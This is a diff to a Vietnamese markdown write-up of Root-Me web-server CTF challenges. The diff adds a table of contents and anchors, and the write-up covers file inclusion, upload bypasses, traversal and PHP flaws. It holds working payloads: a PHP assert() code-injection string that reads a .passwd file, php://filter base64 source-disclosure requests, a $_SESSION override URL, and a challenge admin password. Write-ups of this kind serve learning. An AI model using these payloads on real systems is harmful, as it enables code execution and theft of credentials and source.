@@ -1,3 +1,38 @@
+# Mục lục
+
+
+1	[Local File Inclusion](#01)
+
+2	[Local File Inclusion- Double Encoding](#02)
+
+3	[Local File Inclusion - Wrappers](#03)
+
+4	[Remote File Inclusion](#04)
+
+5	[HTTP - Directory indexing](#05)
+
+6	[File upload - Double extensions](#06)
+
+7	[File upload - MIME type](#07)
+
+8	[Directory traversal](#08)
+
+9	[PHP - assert()](#09)
+
+10 [PHP - Filters](#10)
+
+11	[PHP - register globals](#11)
+
+
+
+
+
+
+
+
+
+
+<a name=01></a>
 ### Local File Inclusion
 ![image](https://user-images.githubusercontent.com/77602549/164174516-0f929bb8-5a10-4fdc-8b86-d54a5687dc73.png)
 
@@ -19,7 +54,7 @@ Chúng ta thử dần các payload sau:
 
 
 
-
+<a name=02></a>
 ## Local File Inclusion - Double encoding
 
 ![image](https://user-images.githubusercontent.com/77602549/164176760-d250d227-f597-4e7c-912a-d9c945de213f.png)
@@ -42,7 +77,7 @@ http://challenge01.root-me.org/web-serveur/ch45/index.php?page=php%253A%252F%252
 ![image](https://user-images.githubusercontent.com/77602549/164178518-8fb1d70b-6565-4528-8787-7cbd74f7fb66.png)
 
 
-
+<a name=03></a>
 ## Local File Inclusion - Wrappers
 
 ![image](https://user-images.githubusercontent.com/77602549/164179748-a96d3d97-6d31-40f9-af6c-74999959a7ec.png)
@@ -93,6 +128,8 @@ name too long
    show_source('flag-mipkBswUppqwXlq9ZydO.php'); 
 ?>
 ```
+
+<a name=04></a>
 ## Remote File Inclusion
 
 
@@ -116,6 +153,7 @@ Chúng ta có thể thấy được source của file index.php như sau:
 
 
 
+<a name=05></a>
 
 ## HTTP - Directory indexing
 
@@ -130,6 +168,7 @@ Chúng ta có thể thấy được source của file index.php như sau:
 ![image](https://user-images.githubusercontent.com/77602549/164369921-1623f8fd-d2b4-4ad5-aed4-0ef04884f0c9.png)
 
 
+<a name=06></a>
 
 ## File upload - Double extensions
 
@@ -161,6 +200,7 @@ echo $data;
 
 ![image](https://user-images.githubusercontent.com/77602549/164960719-3c6f6c01-c6e1-4f1b-9e35-59178a2cd8be.png)
 
+<a name=07></a>
 
 ## File upload – MIME type
 
@@ -185,6 +225,7 @@ Chổ Content-type nó sẽ định nghĩa kiểu dữ liệu mà bạn sẽ upl
 
 
 
+<a name=08></a>
 
 ## Directory traversal
 
@@ -196,6 +237,7 @@ Chổ Content-type nó sẽ định nghĩa kiểu dữ liệu mà bạn sẽ upl
 
 
 
+<a name=09></a>
 
 ## PHP - assert()
 ![image](https://user-images.githubusercontent.com/77602549/164538756-974ad560-7375-403e-927e-553ec78cc2b4.png)
@@ -215,9 +257,13 @@ assert(strpos($i, '..') === False, 'Detect hacking');
 
 ![image](https://user-images.githubusercontent.com/77602549/164540257-9693a9cf-a390-4f01-b3c6-8a116e84374e.png)
 
-
+home%27%20and%20die(show_source(%27.passwd%27))%20or%20%27
 
 ![image](https://user-images.githubusercontent.com/77602549/164540226-f9cc7e33-d0b1-43c8-820e-dfc33750dc17.png)
+
+![image](https://user-images.githubusercontent.com/77602549/164966453-224df2cf-0438-43c8-be9c-5c88931f9528.png)
+
+<a name=10></a>
 
 
 ## PHP - Filters
@@ -232,10 +278,14 @@ inc=php://filter/convert.base64-encode/resource=index.php
 inc=php://filter/convert.base64-encode/resource=ch12.php
 Với trang login.php, sau khi decode base64 thì ta tìm được trang config.php. Flag nằm trong đây:
 
+![image](https://user-images.githubusercontent.com/77602549/164966534-56797e22-78e9-4779-a94a-4f9e01450f44.png)
+
+
 $username="admin";
 $password="DAPt9D2mky0APAF";
 
 
+<a name=11></a>
 
 ## PHP - register globals
 
@@ -249,6 +299,7 @@ http://challenge01.root-me.org/web-serveur/ch17/?_SESSION.logged=1 # FAIL, PHP k
 http://challenge01.root-me.org/web-serveur/ch17/?_SESSION[logged]=1
 
 
+![image](https://user-images.githubusercontent.com/77602549/164966789-3aa4e45f-195a-42ac-9d5b-c020d7ff4234.png)
 
 
 
